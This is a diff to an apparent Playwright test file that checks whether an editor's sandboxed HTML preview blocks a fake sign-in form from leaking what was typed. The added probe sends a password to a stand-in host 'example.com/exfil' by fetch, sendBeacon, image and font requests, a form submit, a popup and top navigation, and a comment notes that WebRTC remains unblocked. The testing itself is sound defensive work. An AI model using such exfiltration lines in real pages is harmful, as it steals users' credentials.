@@ -6,6 +6,22 @@ import { assertTestOrigin } from '../support/origin-guard';
 // #389: an `html` code block previews as a running page in a sandboxed frame
 // that cannot reach the app, its storage or the network. Every isolation check
 // is read from text the block's own script writes into its frame.
+//
+// #975: a block runs without a click, so the sandbox is what keeps a fake sign-in form
+// from sending what was typed in it anywhere. Each way out, and the test that closes it:
+// - same origin (the app's storage, cookies, DOM): "the frame cannot reach the network, storage, ..."
+//   and `sandbox="allow-scripts"` alone in "its inline script runs in the frame ..."
+// - fetch, XHR, sendBeacon (CSP connect-src): "a fake sign-in form gets nothing out ..."
+// - image beacons and remote fonts (CSP img-src, font-src): the same test, and "an external image does not load"
+// - a form submit to a URL (no allow-forms, CSP form-action): the same test
+// - a popup or a new tab (no allow-popups, so no allow-popups-to-escape-sandbox): the same test
+// - navigating the top window (no allow-top-navigation): the same test
+// - navigating its own frame (location.href, a meta refresh, a target=_self link; the app's
+//   frame-src): "... sends nothing off the machine"
+// - a link the block's script clicks: "a link the block's script clicks opens no tab ..."
+// - a link the user clicks: it shows its URL first when the user may not have written the
+//   block (e2e/editor/live-block-links.spec.ts)
+// Not closed here: WebRTC (RTCPeerConnection ICE/STUN) is outside CSP connect-src.
 
 // One line, so typing it never leaves the code block.
 const PROBE = [
@@ -304,6 +320,58 @@ test("html block: a link the block's script clicks opens no tab, a link the user
   expect(requested).toEqual([clicked]);
   // The block's page did not navigate away either.
   await expect(frame.locator('#ran')).toHaveText('clicked');
+});
+
+// #975: everything a block's script can try with what the reader typed, at once. The frame's own
+// CSP reports what it refused; the sandbox makes window.open return null and the top window throw.
+// One line too.
+const EXFIL = 'https://example.com/exfil';
+const EXFIL_PROBE = [
+  `<pre id="out"></pre><form id="f" action="${EXFIL}/form" method="get"><input name="pw" value="hunter2"></form>`,
+  `<style>@font-face { font-family: probe; src: url(${EXFIL}/font.woff2?pw=hunter2); } pre { font-family: probe, monospace; }</style>`,
+  '<script>',
+  "const out = document.getElementById('out');",
+  "const report = (name, result) => { out.textContent += name + ': ' + result + '\\n'; };",
+  "addEventListener('securitypolicyviolation', (event) => report('csp', event.effectiveDirective));",
+  `fetch('${EXFIL}/fetch?pw=hunter2').then(() => report('fetch', 'resolved'), () => report('fetch', 'rejected'));`,
+  `try { navigator.sendBeacon('${EXFIL}/beacon?pw=hunter2', 'hunter2'); } catch (e) { report('sendBeacon', 'threw ' + e.name); }`,
+  `new Image().src = '${EXFIL}/pixel.gif?pw=hunter2';`,
+  `new FontFace('probe2', 'url(${EXFIL}/font2.woff2?pw=hunter2)').load().then(() => report('font', 'loaded'), () => report('font', 'refused'));`,
+  `report('popup', window.open('${EXFIL}/popup?pw=hunter2') === null ? 'blocked' : 'opened');`,
+  `try { top.location.href = '${EXFIL}/top?pw=hunter2'; report('top', 'navigated'); } catch (e) { report('top', 'threw ' + e.name); }`,
+  "document.getElementById('f').submit();",
+  // Had the submit left the page, this would never report.
+  "setTimeout(() => report('form', 'stayed'), 500);",
+  '</script>',
+].join('');
+
+test('html block: a fake sign-in form gets nothing out: fetch, beacons, fonts, a form, a popup and the top window are refused', async ({ reusedApp: app }) => {
+  const requests: string[] = [];
+  await app.context().route(`${EXFIL}/**`, (route) => {
+    requests.push(route.request().url());
+    return route.fulfill({ contentType: 'text/html', headers: { 'Cross-Origin-Resource-Policy': 'cross-origin' }, body: 'escaped' });
+  });
+  const pages: string[] = [];
+  const onPage = (page: Page) => pages.push(page.url());
+  app.context().on('page', onPage);
+
+  const frame = await previewProbe(app, EXFIL_PROBE);
+  const out = frame.locator('#out');
+
+  await expect(out).toContainText('fetch: rejected');
+  await expect(out).toContainText('font: refused');
+  await expect(out).toContainText('popup: blocked');
+  await expect(out).toContainText('top: threw SecurityError');
+  await expect(out).toContainText('form: stayed');
+  for (const directive of ['connect-src', 'img-src', 'font-src']) await expect(out).toContainText(`csp: ${directive}`);
+  // Scripts only: no same origin, forms, popups (so none that escape the sandbox) or top navigation.
+  await expect(activeEditor(app).locator('iframe[title="HTML preview"]')).toHaveAttribute('sandbox', 'allow-scripts');
+
+  app.context().off('page', onPage);
+  // The app stays on its own origin: the top window was never sent to the exfil host.
+  expect(new URL(app.url()).origin).not.toBe(new URL(EXFIL).origin);
+  expect(pages).toEqual([]);
+  expect(requests).toEqual([]);
 });
 
 test('html block: an external image does not load', async ({ reusedApp: app }) => {
